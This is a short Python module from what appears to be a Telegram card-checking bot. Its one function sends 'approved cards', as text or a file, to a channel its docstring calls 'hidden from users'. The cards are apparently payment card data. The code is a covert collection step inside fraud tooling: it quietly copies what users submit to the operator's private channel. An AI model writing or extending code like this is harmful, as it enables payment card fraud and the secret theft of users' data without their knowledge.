import os
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from config import SECRET_CHANNEL_ID, logger

async def send_to_secret_channel(context: ContextTypes.DEFAULT_TYPE, message: str, filename=None):
    """Send approved cards to secret channel (hidden from users)"""
    try:
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as file:
                await context.bot.send_document(
                    chat_id=SECRET_CHANNEL_ID,
                    document=file,
                    filename=filename,
                    caption=message,
                    parse_mode=ParseMode.MARKDOWN
                )
        else:
            await context.bot.send_message(
                chat_id=SECRET_CHANNEL_ID,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
        logger.info(f"✅ Sent to secret channel: {SECRET_CHANNEL_ID}")
    except Exception as e:
        logger.error(f"❌ Failed to send to secret channel: {e}")